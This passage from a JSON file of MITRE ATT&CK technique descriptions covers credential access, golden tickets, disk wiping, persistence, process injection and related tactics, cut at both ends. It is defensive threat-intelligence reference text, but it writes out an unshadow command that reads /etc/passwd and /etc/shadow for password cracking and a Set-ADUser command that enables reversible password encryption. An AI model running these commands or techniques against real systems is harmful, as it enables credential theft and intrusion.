    "An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.(Citation: store_pwd_rev_enc)\n\nIf the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:\n\n1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code>\n2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code>\n3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)\n4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)\n\nWith this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.(Citation: how_pwd_rev_enc_1)(Citation: how_pwd_rev_enc_2)\n\nAn adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher.(Citation: dump_pwd_dcsync) In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>."
  ],
  "steal or forge kerberos tickets: golden ticket": [
    "Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.(Citation: AdSecurity Kerberos GT Aug 2015) Golden tickets enable adversaries to generate authentication material for any account in Active Directory.(Citation: CERT-EU Golden Ticket Protection) \n\nUsing a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.(Citation: ADSecurity Detecting Forged Tickets)\n\nThe KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.(Citation: ADSecurity Kerberos and KRBTGT) The KRBTGT password hash may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) and privileged access to a domain controller."
  ],
  "disk wipe": [
    "Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)"
  ],
  "impair defenses: disable cloud logs": [
    "An adversary may disable cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. \n\nCloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable logging to avoid detection of their activities. For example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic)"
  ],
  "hide artifacts: vba stomping": [
    "Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.(Citation: FireEye VBA stomp Feb 2020)\n\nMS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a <code>PerformanceCache</code> that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the <code>_VBA_PROJECT</code> stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.(Citation: Evil Clippy May 2019)(Citation: Microsoft _VBA_PROJECT Stream)\n\nAn adversary may hide malicious VBA code by overwriting the VBA source code location with zero\u2019s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the <code>_VBA_PROJECT</code> stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.(Citation: Walmart Roberts Oct 2018)(Citation: FireEye VBA stomp Feb 2020)(Citation: pcodedmp Bontchev)"
  ],
  "data manipulation": [
    "Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.\n\nThe type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact."
  ],
  "hijack execution flow: executable installer file permissions weakness": [
    "Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002). Several examples of this weakness in existing common installers have been reported to software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers are Vulnerable) If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence."
  ],
  "hijack execution flow: cor_profiler": [
    "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)\n\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)\n\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)"
  ],
  "acquire infrastructure: dns server": [
    "Adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.\n\nBy running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic ([DNS](https://attack.mitre.org/techniques/T1071/004)). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.(Citation: Unit42 DNS Mar 2019)"
  ],
  "compromise infrastructure: dns server": [
    "Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.\n\nBy compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye DNS Hijack 2019)  Additionally, adversaries may leverage such control in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004) to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications.(Citation: FireEye DNS Hijack 2019)(Citation: Crowdstrike DNS Hijack 2019) Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.(Citation: CiscoAngler)(Citation: Proofpoint Domain Shadowing)"
  ],
  "compromise accounts": [
    "Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. [Establish Accounts](https://attack.mitre.org/techniques/T1585)), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries may directly leverage compromised email accounts for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566)."
  ],
  "develop capabilities: code signing certificates": [
    "Adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\n\nPrior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may develop self-signed code signing certificates for use in operations."
  ],
  "obtain capabilities: exploits": [
    "Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.(Citation: Exploit Database)(Citation: TempertonDarkHotel)(Citation: NationsBuying)\n\nIn addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals.(Citation: PegasusCitizenLab)(Citation: Wired SandCat Oct 2019) In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).(Citation: TempertonDarkHotel)\n\nAn adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004))."
  ],
  "gather victim network information: network topology": [
    "Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: DNS Dumpster) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133))."
  ],
  "gather victim org information: identify business tempo": [
    "Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization\u2019s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim\u2019s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))"
  ],
  "gather victim host information: client configurations": [
    "Adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133))."
  ],
  "forge web credentials": [
    "Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.\n\nAdversaries may generate these credential materials in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539), [Steal Application Access Token](https://attack.mitre.org/techniques/T1528), and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users. The generation of web credentials often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.(Citation: GitHub AWS-ADFS-Credential-Generator)\n\nOnce forged, adversaries may use these web credentials to access resources (ex: [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)(Citation: Microsoft SolarWinds Customer Guidance)"
  ],
  "container and resource discovery": [
    "Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.\n\nThese resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs.(Citation: Docker API)(Citation: Kubernetes API) In Docker, logs may leak information about the environment, such as the environment\u2019s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary\u2019s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution. "
  ],
  "multi-factor authentication request generation": [
    "Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.\n\nAdversaries in possession credentials to [Valid Accounts](https://attack.mitre.org/techniques/T1078) may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account.\n\nIn some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to \u201cMFA fatigue.\u201d(Citation: Russian 2FA Push Annoyance - Cimpanu)(Citation: MFA Fatigue Attacks - PortSwigger)(Citation: Suspected Russian Activity Targeting Government and Business Entities Around the Globe)"
  ],
  "os credential dumping: proc filesystem": [
    "Adversaries may gather credentials from information stored in the Proc filesystem or <code>/proc</code>. The Proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively.\n\nThis functionality has been implemented in the MimiPenguin(Citation: MimiPenguin GitHub May 2017), an open source tool inspired by Mimikatz. The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts."
  ],
  "os credential dumping: /etc/passwd and /etc/shadow": [
    "Adversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.(Citation: Linux Password and Shadow File Formats)\n\nThe Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper:(Citation: nixCraft - John the Ripper) <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>\n"
  ],
  "exfiltration over other network medium: exfiltration over bluetooth": [
    "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network."
  ],
  "automated exfiltration: traffic duplication": [
    "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised network infrastructure.  Traffic mirroring is a native feature for some network devices and used for network analysis and may be configured to duplicate traffic and forward to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other network infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks) Adversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary."
  ],
  "masquerading: space after filename": [
    "Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.\n\nFor example, if there is a Mach-O executable file called <code>evil.bin</code>, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to <code>evil.txt</code>, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to <code>evil.txt </code> (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back).\n\nAdversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious."
  ],
  "boot or logon initialization scripts: network logon script": [
    "Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects.(Citation: Petri Logon Script AD) These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.  \n \nAdversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary."
  ],
  "boot or logon initialization scripts: rc scripts": [
    "Adversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system\u2019s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.\n\nAdversaries can establish persistence by adding a malicious binary path or shell commands to <code>rc.local</code>, <code>rc.common</code>, and other RC scripts specific to the Unix-like distribution.(Citation: IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) Upon reboot, the system executes the script's contents as root, resulting in persistence.\n\nAdversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as IoT or embedded systems.(Citation: intezer-kaiji-malware)\n\nSeveral Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of [Launchd](https://attack.mitre.org/techniques/T1053/004). (Citation: Apple Developer Doco Archive Launchd)(Citation: Startup Items) This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.(Citation: Methods of Mac Malware Persistence) To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.(Citation: Ubuntu Manpage systemd rc)"
  ],
  "boot or logon initialization scripts: startup items": [
    "Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.(Citation: Startup Items)\n\nThis is technically a deprecated technology (superseded by [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)), and thus the appropriate folder, <code>/Library/StartupItems</code> isn\u2019t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist</code>, reside in the top-level directory. \n\nAn adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism.(Citation: Methods of Mac Malware Persistence) Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user."
  ],
  "exfiltration over alternative protocol: exfiltration over symmetric encrypted non-c2 protocol": [
    "Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nSymmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. \n\nNetwork protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP). "
  ],
  "exfiltration over physical medium": [
    "Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems."
  ],
  "scheduled task/job: systemd timers": [
    "Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <code>.timer</code> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to [Cron](https://attack.mitre.org/techniques/T1053/003) in Linux environments.(Citation: archlinux Systemd Timers Aug 2020) Systemd timers may be activated remotely via the <code>systemctl</code> command line utility, which operates over [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: Systemd Remote Control)\n\nEach <code>.timer</code> file must have a corresponding <code>.service</code> file with the same name, e.g., <code>example.timer</code> and <code>example.service</code>. <code>.service</code> files are [Systemd Service](https://attack.mitre.org/techniques/T1543/002) unit files that are managed by the systemd system and service manager.(Citation: Linux man-pages: systemd January 2014) Privileged timers are written to <code>/etc/systemd/system/</code> and <code>/usr/lib/systemd/system</code> while user level are written to <code>~/.config/systemd/user/</code>.\n\nAn adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence."
  ],
  "scheduled task/job: container orchestration job": [
    "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)"
  ],
  "process injection: thread execution hijacking": [
    "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Elastic Process Injection July 2017)\n\nThis is very similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) but targets an existing process rather than creating a process in a suspended state.  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process. "
  ],
  "process injection: ptrace system calls": [
    "Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPtrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.(Citation: PTRACE man) Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: <code>malloc</code>) then invoking that memory with <code>PTRACE_SETREGS</code> to set the register containing the next instruction to execute. Ptrace system call injection can also be done with <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>, which copy data to a specific address in the target processes\u2019 memory (ex: the current address of the next instruction). (Citation: PTRACE man)(Citation: Medium Ptrace JUL 2018) \n\nPtrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.(Citation: BH Linux Inject) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process. "
  ],
  "process injection: vdso hijacking": [
    "Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nVDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via [Ptrace System Calls](https://attack.mitre.org/techniques/T1055/008). However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).(Citation: ELF Injection May 2009)(Citation: Backtrace VDSO)(Citation: VDSO Aug 2005)(Citation: Syscall 2014)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.  "
  ],
  "process injection: listplanting": [
    "Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process. Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.\n\nList-view controls are user interface windows used to display collections of items.(Citation: Microsoft List View Controls) Information about an application's list-view settings are stored within the process' memory in a <code>SysListView32</code> control.\n\nListPlanting (a form of message-passing \"shatter attack\") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items.(Citation: Modexp Windows Process Injection) Adversaries must first copy code into the target process\u2019 memory space, which can be performed various ways including by directly obtaining a handle to the <code>SysListView32</code> child of the victim process window (via Windows API calls such as <code>FindWindow</code> and/or <code>EnumWindows</code>) or other [Process Injection](https://attack.mitre.org/techniques/T1055) methods.\n\nSome variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored <code>WriteProcessMemory</code> function. For example, an adversary 